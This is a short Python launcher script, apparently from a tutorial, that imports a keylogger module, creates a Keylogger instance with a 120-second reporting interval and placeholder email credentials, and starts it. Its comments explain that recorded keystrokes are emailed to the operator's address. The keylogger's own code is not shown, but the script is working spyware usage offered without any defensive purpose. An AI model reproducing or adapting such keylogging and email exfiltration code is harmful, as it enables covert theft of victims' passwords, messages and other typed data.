#!/usr/bin/env python
import keylogger

my_keylogger = keylogger.Keylogger(120, "YYYYYYYYY", "XXXXXXXXX") 
my_keylogger.start()
# we importes the keylogger.py file using import <file name>
# we created a class named Keylogger and made an instance of it
# YYYYYYYYY- Your email where you want the keystrikes
# XXXXXXXXX - Email Password so that in send_mail function we can connect to the email on which we want the keystrikes
